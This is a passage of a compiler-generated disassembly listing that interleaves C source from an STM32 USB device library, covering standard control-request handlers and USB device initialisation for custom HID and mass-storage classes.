        USBD_CtlError(pdev, req);
 800c2c0:	6839      	ldr	r1, [r7, #0]
 800c2c2:	6878      	ldr	r0, [r7, #4]
 800c2c4:	f000 f8a5 	bl	800c412 <USBD_CtlError>
        break;
 800c2c8:	e01a      	b.n	800c300 <USBD_GetStatus+0x60>
      }

#if (USBD_SELF_POWERED == 1U)
      pdev->dev_config_status = USB_CONFIG_SELF_POWERED;
 800c2ca:	687b      	ldr	r3, [r7, #4]
 800c2cc:	2201      	movs	r2, #1
 800c2ce:	60da      	str	r2, [r3, #12]
#else
      pdev->dev_config_status = 0U;
#endif /* USBD_SELF_POWERED */

      if (pdev->dev_remote_wakeup != 0U)
 800c2d0:	687b      	ldr	r3, [r7, #4]
 800c2d2:	f8d3 32a4 	ldr.w	r3, [r3, #676]	; 0x2a4
 800c2d6:	2b00      	cmp	r3, #0
 800c2d8:	d005      	beq.n	800c2e6 <USBD_GetStatus+0x46>
      {
        pdev->dev_config_status |= USB_CONFIG_REMOTE_WAKEUP;
 800c2da:	687b      	ldr	r3, [r7, #4]
 800c2dc:	68db      	ldr	r3, [r3, #12]
 800c2de:	f043 0202 	orr.w	r2, r3, #2
 800c2e2:	687b      	ldr	r3, [r7, #4]
 800c2e4:	60da      	str	r2, [r3, #12]
      }

      (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config_status, 2U);
 800c2e6:	687b      	ldr	r3, [r7, #4]
 800c2e8:	330c      	adds	r3, #12
 800c2ea:	2202      	movs	r2, #2
 800c2ec:	4619      	mov	r1, r3
 800c2ee:	6878      	ldr	r0, [r7, #4]
 800c2f0:	f000 f900 	bl	800c4f4 <USBD_CtlSendData>
      break;
 800c2f4:	e004      	b.n	800c300 <USBD_GetStatus+0x60>

    default:
      USBD_CtlError(pdev, req);
 800c2f6:	6839      	ldr	r1, [r7, #0]
 800c2f8:	6878      	ldr	r0, [r7, #4]
 800c2fa:	f000 f88a 	bl	800c412 <USBD_CtlError>
      break;
 800c2fe:	bf00      	nop
  }
}
 800c300:	bf00      	nop
 800c302:	3708      	adds	r7, #8
 800c304:	46bd      	mov	sp, r7
 800c306:	bd80      	pop	{r7, pc}

0800c308 <USBD_SetFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c308:	b580      	push	{r7, lr}
 800c30a:	b082      	sub	sp, #8
 800c30c:	af00      	add	r7, sp, #0
 800c30e:	6078      	str	r0, [r7, #4]
 800c310:	6039      	str	r1, [r7, #0]
  if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c312:	683b      	ldr	r3, [r7, #0]
 800c314:	885b      	ldrh	r3, [r3, #2]
 800c316:	2b01      	cmp	r3, #1
 800c318:	d107      	bne.n	800c32a <USBD_SetFeature+0x22>
  {
    pdev->dev_remote_wakeup = 1U;
 800c31a:	687b      	ldr	r3, [r7, #4]
 800c31c:	2201      	movs	r2, #1
 800c31e:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
    (void)USBD_CtlSendStatus(pdev);
 800c322:	6878      	ldr	r0, [r7, #4]
 800c324:	f000 f940 	bl	800c5a8 <USBD_CtlSendStatus>
  }
  else
  {
    USBD_CtlError(pdev, req);
  }
}
 800c328:	e013      	b.n	800c352 <USBD_SetFeature+0x4a>
  else if (req->wValue == USB_FEATURE_TEST_MODE)
 800c32a:	683b      	ldr	r3, [r7, #0]
 800c32c:	885b      	ldrh	r3, [r3, #2]
 800c32e:	2b02      	cmp	r3, #2
 800c330:	d10b      	bne.n	800c34a <USBD_SetFeature+0x42>
    pdev->dev_test_mode = (uint8_t)(req->wIndex >> 8);
 800c332:	683b      	ldr	r3, [r7, #0]
 800c334:	889b      	ldrh	r3, [r3, #4]
 800c336:	0a1b      	lsrs	r3, r3, #8
 800c338:	b29b      	uxth	r3, r3
 800c33a:	b2da      	uxtb	r2, r3
 800c33c:	687b      	ldr	r3, [r7, #4]
 800c33e:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
    (void)USBD_CtlSendStatus(pdev);
 800c342:	6878      	ldr	r0, [r7, #4]
 800c344:	f000 f930 	bl	800c5a8 <USBD_CtlSendStatus>
}
 800c348:	e003      	b.n	800c352 <USBD_SetFeature+0x4a>
    USBD_CtlError(pdev, req);
 800c34a:	6839      	ldr	r1, [r7, #0]
 800c34c:	6878      	ldr	r0, [r7, #4]
 800c34e:	f000 f860 	bl	800c412 <USBD_CtlError>
}
 800c352:	bf00      	nop
 800c354:	3708      	adds	r7, #8
 800c356:	46bd      	mov	sp, r7
 800c358:	bd80      	pop	{r7, pc}

0800c35a <USBD_ClrFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_ClrFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c35a:	b580      	push	{r7, lr}
 800c35c:	b082      	sub	sp, #8
 800c35e:	af00      	add	r7, sp, #0
 800c360:	6078      	str	r0, [r7, #4]
 800c362:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c364:	687b      	ldr	r3, [r7, #4]
 800c366:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c36a:	b2db      	uxtb	r3, r3
 800c36c:	3b01      	subs	r3, #1
 800c36e:	2b02      	cmp	r3, #2
 800c370:	d80b      	bhi.n	800c38a <USBD_ClrFeature+0x30>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c372:	683b      	ldr	r3, [r7, #0]
 800c374:	885b      	ldrh	r3, [r3, #2]
 800c376:	2b01      	cmp	r3, #1
 800c378:	d10c      	bne.n	800c394 <USBD_ClrFeature+0x3a>
      {
        pdev->dev_remote_wakeup = 0U;
 800c37a:	687b      	ldr	r3, [r7, #4]
 800c37c:	2200      	movs	r2, #0
 800c37e:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
        (void)USBD_CtlSendStatus(pdev);
 800c382:	6878      	ldr	r0, [r7, #4]
 800c384:	f000 f910 	bl	800c5a8 <USBD_CtlSendStatus>
      }
      break;
 800c388:	e004      	b.n	800c394 <USBD_ClrFeature+0x3a>

    default:
      USBD_CtlError(pdev, req);
 800c38a:	6839      	ldr	r1, [r7, #0]
 800c38c:	6878      	ldr	r0, [r7, #4]
 800c38e:	f000 f840 	bl	800c412 <USBD_CtlError>
      break;
 800c392:	e000      	b.n	800c396 <USBD_ClrFeature+0x3c>
      break;
 800c394:	bf00      	nop
  }
}
 800c396:	bf00      	nop
 800c398:	3708      	adds	r7, #8
 800c39a:	46bd      	mov	sp, r7
 800c39c:	bd80      	pop	{r7, pc}

0800c39e <USBD_ParseSetupRequest>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_ParseSetupRequest(USBD_SetupReqTypedef *req, uint8_t *pdata)
{
 800c39e:	b580      	push	{r7, lr}
 800c3a0:	b084      	sub	sp, #16
 800c3a2:	af00      	add	r7, sp, #0
 800c3a4:	6078      	str	r0, [r7, #4]
 800c3a6:	6039      	str	r1, [r7, #0]
  uint8_t *pbuff = pdata;
 800c3a8:	683b      	ldr	r3, [r7, #0]
 800c3aa:	60fb      	str	r3, [r7, #12]

  req->bmRequest = *(uint8_t *)(pbuff);
 800c3ac:	68fb      	ldr	r3, [r7, #12]
 800c3ae:	781a      	ldrb	r2, [r3, #0]
 800c3b0:	687b      	ldr	r3, [r7, #4]
 800c3b2:	701a      	strb	r2, [r3, #0]

  pbuff++;
 800c3b4:	68fb      	ldr	r3, [r7, #12]
 800c3b6:	3301      	adds	r3, #1
 800c3b8:	60fb      	str	r3, [r7, #12]
  req->bRequest = *(uint8_t *)(pbuff);
 800c3ba:	68fb      	ldr	r3, [r7, #12]
 800c3bc:	781a      	ldrb	r2, [r3, #0]
 800c3be:	687b      	ldr	r3, [r7, #4]
 800c3c0:	705a      	strb	r2, [r3, #1]

  pbuff++;
 800c3c2:	68fb      	ldr	r3, [r7, #12]
 800c3c4:	3301      	adds	r3, #1
 800c3c6:	60fb      	str	r3, [r7, #12]
  req->wValue = SWAPBYTE(pbuff);
 800c3c8:	68f8      	ldr	r0, [r7, #12]
 800c3ca:	f7ff fa16 	bl	800b7fa <SWAPBYTE>
 800c3ce:	4603      	mov	r3, r0
 800c3d0:	461a      	mov	r2, r3
 800c3d2:	687b      	ldr	r3, [r7, #4]
 800c3d4:	805a      	strh	r2, [r3, #2]

  pbuff++;
 800c3d6:	68fb      	ldr	r3, [r7, #12]
 800c3d8:	3301      	adds	r3, #1
 800c3da:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c3dc:	68fb      	ldr	r3, [r7, #12]
 800c3de:	3301      	adds	r3, #1
 800c3e0:	60fb      	str	r3, [r7, #12]
  req->wIndex = SWAPBYTE(pbuff);
 800c3e2:	68f8      	ldr	r0, [r7, #12]
 800c3e4:	f7ff fa09 	bl	800b7fa <SWAPBYTE>
 800c3e8:	4603      	mov	r3, r0
 800c3ea:	461a      	mov	r2, r3
 800c3ec:	687b      	ldr	r3, [r7, #4]
 800c3ee:	809a      	strh	r2, [r3, #4]

  pbuff++;
 800c3f0:	68fb      	ldr	r3, [r7, #12]
 800c3f2:	3301      	adds	r3, #1
 800c3f4:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c3f6:	68fb      	ldr	r3, [r7, #12]
 800c3f8:	3301      	adds	r3, #1
 800c3fa:	60fb      	str	r3, [r7, #12]
  req->wLength = SWAPBYTE(pbuff);
 800c3fc:	68f8      	ldr	r0, [r7, #12]
 800c3fe:	f7ff f9fc 	bl	800b7fa <SWAPBYTE>
 800c402:	4603      	mov	r3, r0
 800c404:	461a      	mov	r2, r3
 800c406:	687b      	ldr	r3, [r7, #4]
 800c408:	80da      	strh	r2, [r3, #6]
}
 800c40a:	bf00      	nop
 800c40c:	3710      	adds	r7, #16
 800c40e:	46bd      	mov	sp, r7
 800c410:	bd80      	pop	{r7, pc}

0800c412 <USBD_CtlError>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_CtlError(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c412:	b580      	push	{r7, lr}
 800c414:	b082      	sub	sp, #8
 800c416:	af00      	add	r7, sp, #0
 800c418:	6078      	str	r0, [r7, #4]
 800c41a:	6039      	str	r1, [r7, #0]
  UNUSED(req);

  (void)USBD_LL_StallEP(pdev, 0x80U);
 800c41c:	2180      	movs	r1, #128	; 0x80
 800c41e:	6878      	ldr	r0, [r7, #4]
 800c420:	f000 fd6a 	bl	800cef8 <USBD_LL_StallEP>
  (void)USBD_LL_StallEP(pdev, 0U);
 800c424:	2100      	movs	r1, #0
 800c426:	6878      	ldr	r0, [r7, #4]
 800c428:	f000 fd66 	bl	800cef8 <USBD_LL_StallEP>
}
 800c42c:	bf00      	nop
 800c42e:	3708      	adds	r7, #8
 800c430:	46bd      	mov	sp, r7
 800c432:	bd80      	pop	{r7, pc}

0800c434 <USBD_GetString>:
  * @param  unicode : Formatted string buffer (unicode)
  * @param  len : descriptor length
  * @retval None
  */
void USBD_GetString(uint8_t *desc, uint8_t *unicode, uint16_t *len)
{
 800c434:	b580      	push	{r7, lr}
 800c436:	b086      	sub	sp, #24
 800c438:	af00      	add	r7, sp, #0
 800c43a:	60f8      	str	r0, [r7, #12]
 800c43c:	60b9      	str	r1, [r7, #8]
 800c43e:	607a      	str	r2, [r7, #4]
  uint8_t idx = 0U;
 800c440:	2300      	movs	r3, #0
 800c442:	75fb      	strb	r3, [r7, #23]
  uint8_t *pdesc;

  if (desc == NULL)
 800c444:	68fb      	ldr	r3, [r7, #12]
 800c446:	2b00      	cmp	r3, #0
 800c448:	d036      	beq.n	800c4b8 <USBD_GetString+0x84>
  {
    return;
  }

  pdesc = desc;
 800c44a:	68fb      	ldr	r3, [r7, #12]
 800c44c:	613b      	str	r3, [r7, #16]
  *len = ((uint16_t)USBD_GetLen(pdesc) * 2U) + 2U;
 800c44e:	6938      	ldr	r0, [r7, #16]
 800c450:	f000 f836 	bl	800c4c0 <USBD_GetLen>
 800c454:	4603      	mov	r3, r0
 800c456:	3301      	adds	r3, #1
 800c458:	b29b      	uxth	r3, r3
 800c45a:	005b      	lsls	r3, r3, #1
 800c45c:	b29a      	uxth	r2, r3
 800c45e:	687b      	ldr	r3, [r7, #4]
 800c460:	801a      	strh	r2, [r3, #0]

  unicode[idx] = *(uint8_t *)len;
 800c462:	7dfb      	ldrb	r3, [r7, #23]
 800c464:	68ba      	ldr	r2, [r7, #8]
 800c466:	4413      	add	r3, r2
 800c468:	687a      	ldr	r2, [r7, #4]
 800c46a:	7812      	ldrb	r2, [r2, #0]
 800c46c:	701a      	strb	r2, [r3, #0]
  idx++;
 800c46e:	7dfb      	ldrb	r3, [r7, #23]
 800c470:	3301      	adds	r3, #1
 800c472:	75fb      	strb	r3, [r7, #23]
  unicode[idx] = USB_DESC_TYPE_STRING;
 800c474:	7dfb      	ldrb	r3, [r7, #23]
 800c476:	68ba      	ldr	r2, [r7, #8]
 800c478:	4413      	add	r3, r2
 800c47a:	2203      	movs	r2, #3
 800c47c:	701a      	strb	r2, [r3, #0]
  idx++;
 800c47e:	7dfb      	ldrb	r3, [r7, #23]
 800c480:	3301      	adds	r3, #1
 800c482:	75fb      	strb	r3, [r7, #23]

  while (*pdesc != (uint8_t)'\0')
 800c484:	e013      	b.n	800c4ae <USBD_GetString+0x7a>
  {
    unicode[idx] = *pdesc;
 800c486:	7dfb      	ldrb	r3, [r7, #23]
 800c488:	68ba      	ldr	r2, [r7, #8]
 800c48a:	4413      	add	r3, r2
 800c48c:	693a      	ldr	r2, [r7, #16]
 800c48e:	7812      	ldrb	r2, [r2, #0]
 800c490:	701a      	strb	r2, [r3, #0]
    pdesc++;
 800c492:	693b      	ldr	r3, [r7, #16]
 800c494:	3301      	adds	r3, #1
 800c496:	613b      	str	r3, [r7, #16]
    idx++;
 800c498:	7dfb      	ldrb	r3, [r7, #23]
 800c49a:	3301      	adds	r3, #1
 800c49c:	75fb      	strb	r3, [r7, #23]

    unicode[idx] = 0U;
 800c49e:	7dfb      	ldrb	r3, [r7, #23]
 800c4a0:	68ba      	ldr	r2, [r7, #8]
 800c4a2:	4413      	add	r3, r2
 800c4a4:	2200      	movs	r2, #0
 800c4a6:	701a      	strb	r2, [r3, #0]
    idx++;
 800c4a8:	7dfb      	ldrb	r3, [r7, #23]
 800c4aa:	3301      	adds	r3, #1
 800c4ac:	75fb      	strb	r3, [r7, #23]
  while (*pdesc != (uint8_t)'\0')
 800c4ae:	693b      	ldr	r3, [r7, #16]
 800c4b0:	781b      	ldrb	r3, [r3, #0]
 800c4b2:	2b00      	cmp	r3, #0
 800c4b4:	d1e7      	bne.n	800c486 <USBD_GetString+0x52>
 800c4b6:	e000      	b.n	800c4ba <USBD_GetString+0x86>
    return;
 800c4b8:	bf00      	nop
  }
}
 800c4ba:	3718      	adds	r7, #24
 800c4bc:	46bd      	mov	sp, r7
 800c4be:	bd80      	pop	{r7, pc}

0800c4c0 <USBD_GetLen>:
  *         return the string length
   * @param  buf : pointer to the ascii string buffer
  * @retval string length
  */
static uint8_t USBD_GetLen(uint8_t *buf)
{
 800c4c0:	b480      	push	{r7}
 800c4c2:	b085      	sub	sp, #20
 800c4c4:	af00      	add	r7, sp, #0
 800c4c6:	6078      	str	r0, [r7, #4]
  uint8_t  len = 0U;
 800c4c8:	2300      	movs	r3, #0
 800c4ca:	73fb      	strb	r3, [r7, #15]
  uint8_t *pbuff = buf;
 800c4cc:	687b      	ldr	r3, [r7, #4]
 800c4ce:	60bb      	str	r3, [r7, #8]

  while (*pbuff != (uint8_t)'\0')
 800c4d0:	e005      	b.n	800c4de <USBD_GetLen+0x1e>
  {
    len++;
 800c4d2:	7bfb      	ldrb	r3, [r7, #15]
 800c4d4:	3301      	adds	r3, #1
 800c4d6:	73fb      	strb	r3, [r7, #15]
    pbuff++;
 800c4d8:	68bb      	ldr	r3, [r7, #8]
 800c4da:	3301      	adds	r3, #1
 800c4dc:	60bb      	str	r3, [r7, #8]
  while (*pbuff != (uint8_t)'\0')
 800c4de:	68bb      	ldr	r3, [r7, #8]
 800c4e0:	781b      	ldrb	r3, [r3, #0]
 800c4e2:	2b00      	cmp	r3, #0
 800c4e4:	d1f5      	bne.n	800c4d2 <USBD_GetLen+0x12>
  }

  return len;
 800c4e6:	7bfb      	ldrb	r3, [r7, #15]
}
 800c4e8:	4618      	mov	r0, r3
 800c4ea:	3714      	adds	r7, #20
 800c4ec:	46bd      	mov	sp, r7
 800c4ee:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c4f2:	4770      	bx	lr

0800c4f4 <USBD_CtlSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendData(USBD_HandleTypeDef *pdev,
                                    uint8_t *pbuf, uint32_t len)
{
 800c4f4:	b580      	push	{r7, lr}
 800c4f6:	b084      	sub	sp, #16
 800c4f8:	af00      	add	r7, sp, #0
 800c4fa:	60f8      	str	r0, [r7, #12]
 800c4fc:	60b9      	str	r1, [r7, #8]
 800c4fe:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_IN;
 800c500:	68fb      	ldr	r3, [r7, #12]
 800c502:	2202      	movs	r2, #2
 800c504:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_in[0].total_length = len;
 800c508:	68fb      	ldr	r3, [r7, #12]
 800c50a:	687a      	ldr	r2, [r7, #4]
 800c50c:	619a      	str	r2, [r3, #24]

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_in[0].rem_length = 0U;
#else
  pdev->ep_in[0].rem_length = len;
 800c50e:	68fb      	ldr	r3, [r7, #12]
 800c510:	687a      	ldr	r2, [r7, #4]
 800c512:	61da      	str	r2, [r3, #28]
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c514:	687b      	ldr	r3, [r7, #4]
 800c516:	68ba      	ldr	r2, [r7, #8]
 800c518:	2100      	movs	r1, #0
 800c51a:	68f8      	ldr	r0, [r7, #12]
 800c51c:	f000 fdbc 	bl	800d098 <USBD_LL_Transmit>

  return USBD_OK;
 800c520:	2300      	movs	r3, #0
}
 800c522:	4618      	mov	r0, r3
 800c524:	3710      	adds	r7, #16
 800c526:	46bd      	mov	sp, r7
 800c528:	bd80      	pop	{r7, pc}

0800c52a <USBD_CtlContinueSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueSendData(USBD_HandleTypeDef *pdev,
                                            uint8_t *pbuf, uint32_t len)
{
 800c52a:	b580      	push	{r7, lr}
 800c52c:	b084      	sub	sp, #16
 800c52e:	af00      	add	r7, sp, #0
 800c530:	60f8      	str	r0, [r7, #12]
 800c532:	60b9      	str	r1, [r7, #8]
 800c534:	607a      	str	r2, [r7, #4]
  /* Start the next transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c536:	687b      	ldr	r3, [r7, #4]
 800c538:	68ba      	ldr	r2, [r7, #8]
 800c53a:	2100      	movs	r1, #0
 800c53c:	68f8      	ldr	r0, [r7, #12]
 800c53e:	f000 fdab 	bl	800d098 <USBD_LL_Transmit>

  return USBD_OK;
 800c542:	2300      	movs	r3, #0
}
 800c544:	4618      	mov	r0, r3
 800c546:	3710      	adds	r7, #16
 800c548:	46bd      	mov	sp, r7
 800c54a:	bd80      	pop	{r7, pc}

0800c54c <USBD_CtlPrepareRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlPrepareRx(USBD_HandleTypeDef *pdev,
                                     uint8_t *pbuf, uint32_t len)
{
 800c54c:	b580      	push	{r7, lr}
 800c54e:	b084      	sub	sp, #16
 800c550:	af00      	add	r7, sp, #0
 800c552:	60f8      	str	r0, [r7, #12]
 800c554:	60b9      	str	r1, [r7, #8]
 800c556:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_OUT;
 800c558:	68fb      	ldr	r3, [r7, #12]
 800c55a:	2203      	movs	r2, #3
 800c55c:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_out[0].total_length = len;
 800c560:	68fb      	ldr	r3, [r7, #12]
 800c562:	687a      	ldr	r2, [r7, #4]
 800c564:	f8c3 2158 	str.w	r2, [r3, #344]	; 0x158

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_out[0].rem_length = 0U;
#else
  pdev->ep_out[0].rem_length = len;
 800c568:	68fb      	ldr	r3, [r7, #12]
 800c56a:	687a      	ldr	r2, [r7, #4]
 800c56c:	f8c3 215c 	str.w	r2, [r3, #348]	; 0x15c
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c570:	687b      	ldr	r3, [r7, #4]
 800c572:	68ba      	ldr	r2, [r7, #8]
 800c574:	2100      	movs	r1, #0
 800c576:	68f8      	ldr	r0, [r7, #12]
 800c578:	f000 fdc6 	bl	800d108 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c57c:	2300      	movs	r3, #0
}
 800c57e:	4618      	mov	r0, r3
 800c580:	3710      	adds	r7, #16
 800c582:	46bd      	mov	sp, r7
 800c584:	bd80      	pop	{r7, pc}

0800c586 <USBD_CtlContinueRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueRx(USBD_HandleTypeDef *pdev,
                                      uint8_t *pbuf, uint32_t len)
{
 800c586:	b580      	push	{r7, lr}
 800c588:	b084      	sub	sp, #16
 800c58a:	af00      	add	r7, sp, #0
 800c58c:	60f8      	str	r0, [r7, #12]
 800c58e:	60b9      	str	r1, [r7, #8]
 800c590:	607a      	str	r2, [r7, #4]
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c592:	687b      	ldr	r3, [r7, #4]
 800c594:	68ba      	ldr	r2, [r7, #8]
 800c596:	2100      	movs	r1, #0
 800c598:	68f8      	ldr	r0, [r7, #12]
 800c59a:	f000 fdb5 	bl	800d108 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c59e:	2300      	movs	r3, #0
}
 800c5a0:	4618      	mov	r0, r3
 800c5a2:	3710      	adds	r7, #16
 800c5a4:	46bd      	mov	sp, r7
 800c5a6:	bd80      	pop	{r7, pc}

0800c5a8 <USBD_CtlSendStatus>:
  *         send zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendStatus(USBD_HandleTypeDef *pdev)
{
 800c5a8:	b580      	push	{r7, lr}
 800c5aa:	b082      	sub	sp, #8
 800c5ac:	af00      	add	r7, sp, #0
 800c5ae:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_IN;
 800c5b0:	687b      	ldr	r3, [r7, #4]
 800c5b2:	2204      	movs	r2, #4
 800c5b4:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, NULL, 0U);
 800c5b8:	2300      	movs	r3, #0
 800c5ba:	2200      	movs	r2, #0
 800c5bc:	2100      	movs	r1, #0
 800c5be:	6878      	ldr	r0, [r7, #4]
 800c5c0:	f000 fd6a 	bl	800d098 <USBD_LL_Transmit>

  return USBD_OK;
 800c5c4:	2300      	movs	r3, #0
}
 800c5c6:	4618      	mov	r0, r3
 800c5c8:	3708      	adds	r7, #8
 800c5ca:	46bd      	mov	sp, r7
 800c5cc:	bd80      	pop	{r7, pc}

0800c5ce <USBD_CtlReceiveStatus>:
  *         receive zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlReceiveStatus(USBD_HandleTypeDef *pdev)
{
 800c5ce:	b580      	push	{r7, lr}
 800c5d0:	b082      	sub	sp, #8
 800c5d2:	af00      	add	r7, sp, #0
 800c5d4:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_OUT;
 800c5d6:	687b      	ldr	r3, [r7, #4]
 800c5d8:	2205      	movs	r2, #5
 800c5da:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800c5de:	2300      	movs	r3, #0
 800c5e0:	2200      	movs	r2, #0
 800c5e2:	2100      	movs	r1, #0
 800c5e4:	6878      	ldr	r0, [r7, #4]
 800c5e6:	f000 fd8f 	bl	800d108 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c5ea:	2300      	movs	r3, #0
}
 800c5ec:	4618      	mov	r0, r3
 800c5ee:	3708      	adds	r7, #8
 800c5f0:	46bd      	mov	sp, r7
 800c5f2:	bd80      	pop	{r7, pc}

0800c5f4 <MX_USB_DEVICE_Init>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init(void)
{
 800c5f4:	b580      	push	{r7, lr}
 800c5f6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c5f8:	2200      	movs	r2, #0
 800c5fa:	4912      	ldr	r1, [pc, #72]	; (800c644 <MX_USB_DEVICE_Init+0x50>)
 800c5fc:	4812      	ldr	r0, [pc, #72]	; (800c648 <MX_USB_DEVICE_Init+0x54>)
 800c5fe:	f7fe fd68 	bl	800b0d2 <USBD_Init>
 800c602:	4603      	mov	r3, r0
 800c604:	2b00      	cmp	r3, #0
 800c606:	d001      	beq.n	800c60c <MX_USB_DEVICE_Init+0x18>
  {
    Error_Handler();
 800c608:	f7f4 fc7e 	bl	8000f08 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS, &USBD_CUSTOM_HID) != USBD_OK)
 800c60c:	490f      	ldr	r1, [pc, #60]	; (800c64c <MX_USB_DEVICE_Init+0x58>)
 800c60e:	480e      	ldr	r0, [pc, #56]	; (800c648 <MX_USB_DEVICE_Init+0x54>)
 800c610:	f7fe fd8f 	bl	800b132 <USBD_RegisterClass>
 800c614:	4603      	mov	r3, r0
 800c616:	2b00      	cmp	r3, #0
 800c618:	d001      	beq.n	800c61e <MX_USB_DEVICE_Init+0x2a>
  {
    Error_Handler();
 800c61a:	f7f4 fc75 	bl	8000f08 <Error_Handler>
  }
  if (USBD_CUSTOM_HID_RegisterInterface(&hUsbDeviceFS, &USBD_CustomHID_fops_FS) != USBD_OK)
 800c61e:	490c      	ldr	r1, [pc, #48]	; (800c650 <MX_USB_DEVICE_Init+0x5c>)
 800c620:	4809      	ldr	r0, [pc, #36]	; (800c648 <MX_USB_DEVICE_Init+0x54>)
 800c622:	f7fc fca5 	bl	8008f70 <USBD_CUSTOM_HID_RegisterInterface>
 800c626:	4603      	mov	r3, r0
 800c628:	2b00      	cmp	r3, #0
 800c62a:	d001      	beq.n	800c630 <MX_USB_DEVICE_Init+0x3c>
  {
    Error_Handler();
 800c62c:	f7f4 fc6c 	bl	8000f08 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS) != USBD_OK)
 800c630:	4805      	ldr	r0, [pc, #20]	; (800c648 <MX_USB_DEVICE_Init+0x54>)
 800c632:	f7fe fdb4 	bl	800b19e <USBD_Start>
 800c636:	4603      	mov	r3, r0
 800c638:	2b00      	cmp	r3, #0
 800c63a:	d001      	beq.n	800c640 <MX_USB_DEVICE_Init+0x4c>
  {
    Error_Handler();
 800c63c:	f7f4 fc64 	bl	8000f08 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */
  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c640:	bf00      	nop
 800c642:	bd80      	pop	{r7, pc}
 800c644:	200001ac 	.word	0x200001ac
 800c648:	200003c0 	.word	0x200003c0
 800c64c:	2000002c 	.word	0x2000002c
 800c650:	2000019c 	.word	0x2000019c

0800c654 <MX_USB_DEVICE_Init_MSC>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init_MSC(void)
{
 800c654:	b580      	push	{r7, lr}
 800c656:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS_MSC, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c658:	2200      	movs	r2, #0
 800c65a:	4912      	ldr	r1, [pc, #72]	; (800c6a4 <MX_USB_DEVICE_Init_MSC+0x50>)
 800c65c:	4812      	ldr	r0, [pc, #72]	; (800c6a8 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c65e:	f7fe fd38 	bl	800b0d2 <USBD_Init>
 800c662:	4603      	mov	r3, r0
 800c664:	2b00      	cmp	r3, #0
 800c666:	d001      	beq.n	800c66c <MX_USB_DEVICE_Init_MSC+0x18>
  {
    Error_Handler();
 800c668:	f7f4 fc4e 	bl	8000f08 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS_MSC, &USBD_MSC) != USBD_OK)
